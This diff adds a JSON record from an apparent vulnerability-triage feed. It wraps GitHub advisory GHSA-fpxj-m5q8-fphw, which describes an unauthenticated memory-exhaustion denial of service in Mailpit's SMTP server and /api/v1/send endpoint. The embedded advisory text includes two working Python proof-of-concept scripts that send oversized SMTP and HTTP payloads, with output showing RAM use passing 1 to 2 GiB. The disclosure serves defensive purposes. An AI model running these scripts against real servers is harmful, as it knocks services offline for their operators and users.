@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/35239791?v=4\", \"events_url\": \"https://api.github.com/users/KadirArslan/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/KadirArslan/followers\", \"following_url\": \"https://api.github.com/users/KadirArslan/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/KadirArslan/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/KadirArslan\", \"id\": 35239791, \"login\": \"KadirArslan\", \"node_id\": \"MDQ6VXNlcjM1MjM5Nzkx\", \"organizations_url\": \"https://api.github.com/users/KadirArslan/orgs\", \"received_events_url\": \"https://api.github.com/users/KadirArslan/received_events\", \"repos_url\": \"https://api.github.com/users/KadirArslan/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/KadirArslan/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/KadirArslan/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/KadirArslan\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45713\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-400\", \"name\": \"Uncontrolled Resource Consumption\"}, {\"cwe_id\": \"CWE-770\", \"name\": \"Allocation of Resources Without Limits or Throttling\"}], \"description\": \"### Summary\\nThe Mailpit SMTP server has a Server.MaxSize int field that controls the maximum allowed DATA payload size, but the field is never assigned anywhere outside test code, leaving it at Go's zero value (0 ⇒ \\\"no limit\\\"). The same applies to the HTTP /api/v1/send endpoint, whose request body is decoded with json.NewDecoder(r.Body) and no http.MaxBytesReader. Because Mailpit's default listeners bind [::]:1025 (SMTP) and [::]:8025 (HTTP), with no authentication required on either, a single network-reachable attacker can push an arbitrarily large message into Mailpit and watch RAM consumption spike with a ~7-10× amplification factor (raw frame → enmime envelope tree → search-text index → zstd-encoded write to SQLite). Repeating the attack — or running it concurrently from multiple connections — drives the process to OOM-kill.\\n\\n### Details\\nPre-auth, remote DoS on every Mailpit deployment running the default configuration. Memory is the primary axis; disk is a secondary one, because each oversized message is also persisted to the SQLite store (config.MaxMessages caps the count at 500 but never the bytes — so 500 attacker-sized messages × 1 GiB each = ~500 GiB on the host disk before the LRU rotates).\\n\\n\\nAffected code\\n[internal/smtpd/smtpd.go:107](https://github.com/axllent/mailpit/blob/develop/internal/smtpd/smtpd.go#L107) — the field exists:\\n\\n```\\ntype Server struct {\\n    ...\\n    MaxSize int // Maximum message size allowed, in bytes\\n    ...\\n}\\n```\\n[internal/smtpd/smtpd.go:863-877](https://github.com/axllent/mailpit/blob/develop/internal/smtpd/smtpd.go#L863-L877) — the enforcement is gated on > 0:\\n\\n```\\nfor {\\n    ...\\n    line, err := s.br.ReadBytes('\\\\n')\\n    if err != nil {\\n        return nil, err\\n    }\\n    if bytes.Equal(line, []byte(\\\".\\\\r\\\\n\\\")) {\\n        break\\n    }\\n    if line[0] == '.' {\\n        line = line[1:]\\n    }\\n\\n    if s.srv.MaxSize > 0 {                                   // ← only when set\\n        if len(data)+len(line) > s.srv.MaxSize {\\n            _, _ = s.br.Discard(s.br.Buffered())\\n            return nil, maxSizeExceeded(s.srv.MaxSize)\\n        }\\n    }\\n    data = append(data, line...)                             // ← otherwise grows unbounded\\n}\\n```\\n[internal/smtpd/main.go:223-248](https://github.com/axllent/mailpit/blob/develop/internal/smtpd/main.go#L223-L248) — the field is never populated; grep -rn \\\"MaxSize\\\" cmd/ config/ returns zero hits. There is no --smtp-max-message-size CLI flag, no MP_SMTP_MAX_MESSAGE_SIZE env var.\\n\\n[server/apiv1/send.go:45-52](https://github.com/axllent/mailpit/blob/develop/server/apiv1/send.go#L45-L52) — HTTP path has the same defect:\\n\\n```\\ndecoder := json.NewDecoder(r.Body)\\ndata := sendMessageParams{}\\nif err := decoder.Decode(&data.Body); err != nil {\\n    httpJSONError(w, err.Error())\\n    return\\n}\\n```\\n\\nNo r.Body = http.MaxBytesReader(w, r.Body, N) wrapper; server.ReadTimeout of 30 s is transmission-time, not body-size-budget.\\n\\n### PoC\\nBaseline RSS on a freshly-started binary: 25 MiB. After one 100 MiB SMTP DATA block: ~1 037 MiB (≈10× amplification, single connection, no auth):\\n\\n```\\n#!/usr/bin/env python3\\n# poc-smtp-dos.py\\nimport socket, sys\\nhost, port = sys.argv[1], int(sys.argv[2])\\nmb         = int(sys.argv[3])  # message size, MiB\\n\\ns = socket.create_connection((host, port), timeout=120)\\ndef r(): return s.recv(4096).decode(\\\"latin-1\\\", \\\"replace\\\").strip()\\nprint(r())\\nfor cmd in [b\\\"HELO x\\\\r\\\\n\\\",\\n            b\\\"MAIL FROM:<a@b.com>\\\\r\\\\n\\\",\\n            b\\\"RCPT TO:<c@d.com>\\\\r\\\\n\\\",\\n            b\\\"DATA\\\\r\\\\n\\\"]:\\n    s.sendall(cmd); print(r())\\ns.sendall(b\\\"Subject: oversize\\\\r\\\\n\\\\r\\\\n\\\")\\nchunk = b\\\"X\\\" * (1024 * 1024)\\nfor _ in range(mb): s.sendall(chunk)\\ns.sendall(b\\\"\\\\r\\\\n.\\\\r\\\\n\\\")\\nprint(r()); s.close()\\n```\\n\\n```\\n$ python3 poc-smtp-dos.py 127.0.0.1 1025 100\\n220 hostname Mailpit ESMTP Service ready\\n250 hostname greets x\\n250 2.1.0 Ok\\n250 2.1.5 Ok\\n354 Start mail input; end with <CR><LF>.<CR><LF>\\n250 2.0.0 Ok: queued as 58rI69JTJYjVFwogEbw9Jj\\n\\n$ ps -o rss= -p $(pgrep -f /usr/local/bin/mailpit)\\n1062848    # ≈ 1 037 MiB, up from 25 MiB baseline\\n```\\n\\nEquivalent over HTTP:\\n\\n```\\n# poc-http-dos.py\\nimport socket, sys\\nhost, port, mb = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])\\nprefix = b'{\\\"From\\\":{\\\"Email\\\":\\\"a@b.com\\\"},\\\"To\\\":[{\\\"Email\\\":\\\"c@d.com\\\"}],\\\"Subject\\\":\\\"big\\\",\\\"Text\\\":\\\"'\\nsuffix = b'\\\"}'\\nN      = mb * 1024 * 1024\\nclen   = len(prefix) + N + len(suffix)\\n\\ns = socket.create_connection((host, port), timeout=120)\\ns.sendall(\\n    b\\\"POST /api/v1/send HTTP/1.1\\\\r\\\\n\\\"\\n    b\\\"Host: x\\\\r\\\\n\\\"\\n    b\\\"Content-Type: application/json\\\\r\\\\n\\\"\\n    b\\\"Content-Length: \\\" + str(clen).encode() + b\\\"\\\\r\\\\n\\\"\\n    b\\\"Connection: close\\\\r\\\\n\\\\r\\\\n\\\")\\ns.sendall(prefix)\\nchunk = b\\\"X\\\" * (1024 * 1024)\\nfor _ in range(mb): s.sendall(chunk)\\ns.sendall(suffix)\\nprint(s.recv(500).decode(\\\"latin-1\\\", \\\"replace\\\"))\\n```\\n\\n```\\n$ python3 poc-http-dos.py 127.0.0.1 8025 200\\nHTTP/1.1 200 OK\\n...\\n$ ps -o rss= -p $(pgrep -f /usr/local/bin/mailpit)\\n2147000      # comfortably above 2 GiB on the same process\\n\\n```\\n\\nFive concurrent SMTP connections × 50 MiB each took the same machine from 25 MiB → 1 970 MiB during the attack window. With sufficient bandwidth the only ceiling is host RAM.\\n\\n### Impact\\nUnauthenticated remote attackers can send arbitrarily large emails via SMTP or HTTP, causing unbounded memory and disk growth, leading to out-of-memory (OOM) kills and full Mailpit process crash (DoS)\", \"epss\": {\"percentage\": 0.00099, \"percentile\": 0.27271}, \"ghsa_id\": \"GHSA-fpxj-m5q8-fphw\", \"github_reviewed_at\": \"2026-05-19T15:54:12Z\", \"html_url\": \"https://github.com/advisories/GHSA-fpxj-m5q8-fphw\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-fpxj-m5q8-fphw\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45713\"}], \"nvd_published_at\": null, \"published_at\": \"2026-05-19T15:54:12Z\", \"references\": [\"https://github.com/axllent/mailpit/security/advisories/GHSA-fpxj-m5q8-fphw\", \"https://github.com/axllent/mailpit/releases/tag/v1.30.0\", \"https://github.com/advisories/GHSA-fpxj-m5q8-fphw\"], \"repository_advisory_url\": \"https://api.github.com/repos/axllent/mailpit/security-advisories/GHSA-fpxj-m5q8-fphw\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/axllent/mailpit\", \"summary\": \"Mailpit: Unauthenticated remote memory-exhaustion DoS via unlimited SMTP DATA and /api/v1/send body sizes\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-19T15:54:13Z\", \"url\": \"https://api.github.com/advisories/GHSA-fpxj-m5q8-fphw\", \"vulnerabilities\": [{\"first_patched_version\": \"1.30.0\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/axllent/mailpit\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.30.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-fpxj-m5q8-fphw",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/axllent/mailpit: < 1.30.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-45713"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/axllent/mailpit"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:01.787516Z",
+  "provenance": {
+    "content_sha256": "762df219c147606b8a387afd4600e86b83e9961fb6b8cf9715fa56beb69f0752",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-19T15:54:12Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-fpxj-m5q8-fphw",
+  "status": "active",
+  "title": "Mailpit: Unauthenticated remote memory-exhaustion DoS via unlimited SMTP DATA and /api/v1/send body sizes",
+  "updated_at": "2026-05-19T15:54:13Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-fpxj-m5q8-fphw"
+}
